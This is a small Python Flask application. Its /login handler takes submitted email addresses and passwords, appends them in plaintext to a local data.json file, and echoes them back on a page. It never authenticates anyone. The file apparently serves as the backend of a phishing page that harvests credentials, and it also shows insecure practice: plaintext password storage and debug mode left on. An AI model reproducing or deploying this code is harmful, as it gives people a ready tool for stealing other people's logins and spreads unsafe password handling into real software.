from flask import Flask, render_template, request
import json


app = Flask(__name__)


@app.route('/')
def home_page():
    return render_template('index.html')


def save_data(username, password):
    user_data = {'emai_id': username, 'password': password}
    with open("data.json", encoding='utf-8', errors='ignore') as json_data:
        data1 = json.load(json_data, strict=False)
        with open("data.json", "w") as file2:
            data1.append(user_data)

            json.dump(data1, file2, indent=4)


@app.route('/login', methods=['POST'])
def login():
    username = request.form['email']
    password = request.form['password']
    return render_template('login.html', uname=username, pas=password), save_data(username, password)


if __name__ == "__main__":
    app.run(debug=True)














